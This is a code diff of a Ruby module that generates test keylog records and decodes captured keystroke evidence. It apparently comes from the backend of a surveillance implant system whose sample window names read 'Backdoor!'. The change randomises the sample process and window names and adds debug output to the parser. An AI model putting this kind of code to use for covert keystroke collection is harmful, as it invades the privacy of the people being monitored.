@@ -10,8 +10,8 @@ module KeylogEvidence
   KEYSTROKES = ["привет мир", "こんにちは世界", "Hello world!", "Ciao mondo!"]
   
   def content
-    proc_name = "ruby".to_utf16le_binary_null
-    window_name = "Ruby Backdoor!".to_utf16le_binary_null
+    proc_name = ["ruby", "python", "go", "javascript", "c++", "java"].sample.to_utf16le_binary_null
+    window_name = ["Ruby Backdoor!", "Python Backdoor!", "Go Backdoor!", "Javascript Backdoor!", "C++ Backdoor!", "Java Backdoor!"].sample.to_utf16le_binary_null
     content = StringIO.new
     t = Time.now.getutc
     content.write [t.sec, t.min, t.hour, t.mday, t.mon, t.year, t.wday, t.yday, t.isdst ? 0 : 1].pack('l*')
@@ -31,34 +31,50 @@ module KeylogEvidence
     ret
   end
   
-  def decode_content
-    stream = StringIO.new @info[:chunks].join
-    stream.read 2 # first 2 bytes of null termination (Naga weirdness ...)
+  def decode_content(common_info, chunks)
     
-    evidences = Array.new
+    stream = StringIO.new chunks.join
+    stream.read 2 # first 2 bytes of null termination (Naga weirdness ...)
+
     until stream.eof?
+
       tm = stream.read 36
-      @info[:acquired] = Time.gm(*tm.unpack('l*'), 0)
-      @info[:data][:process] = ''
-      @info[:data][:window] = ''
-      @info[:data][:content] = ''
+      timestamp = tm.unpack('l*')
+      
+      puts "STREAM POS #{stream.pos} SIZE #{stream.size}"
+      puts "TIMESTAMP #{timestamp.inspect} OBJECT_ID #{self.object_id}"
+
+      info = Hash[common_info]
+      info[:acquired] = Time.gm(*timestamp, 0)
+      info[:data] = Hash.new
+      info[:data][:process] = ''
+      info[:data][:window] = ''
+      info[:data][:content] = ''
       
       process_name = stream.read_utf16le_string
-      @info[:data][:process] = process_name.utf16le_to_utf8 unless process_name.nil?
+      puts "PROCESS NAME UTF-16LE #{process_name}"
+      info[:data][:process] = process_name.utf16le_to_utf8 unless process_name.nil?
+
+      puts "PROCESS NAME UTF-8 #{info[:data][:process]}"
+
       window_name = stream.read_utf16le_string
-      @info[:data][:window] = window_name.utf16le_to_utf8 unless window_name.nil?
+      info[:data][:window] = window_name.utf16le_to_utf8 unless window_name.nil?
+      
+      puts "WINDOW NAME #{info[:data][:window]}"
       
       delim = stream.read(4).unpack("L*").first
       raise EvidenceDeserializeError.new("Malformed KEYLOG (missing delimiter)") unless delim == ELEM_DELIMITER
       
-      keystrokes = stream.read_utf16le_string
-      @info[:data][:content] = keystrokes.utf16le_to_utf8 unless keystrokes.nil?
+      puts "DELIM #{delim.to_s(16)}"
       
-      # this is not the real clone! redefined clone ...
-      evidences << self.clone
+      keystrokes = stream.read_utf16le_string
+      puts "KEYSTROKES UTF-16LE #{keystrokes}"
+      info[:data][:content] = keystrokes.utf16le_to_utf8 unless keystrokes.nil?
+      
+      puts "KEYSTROKES UTF-8 #{info[:data][:content]}"
+      
+      yield info if block_given?
     end
-    
-    return evidences
   end
 end
 
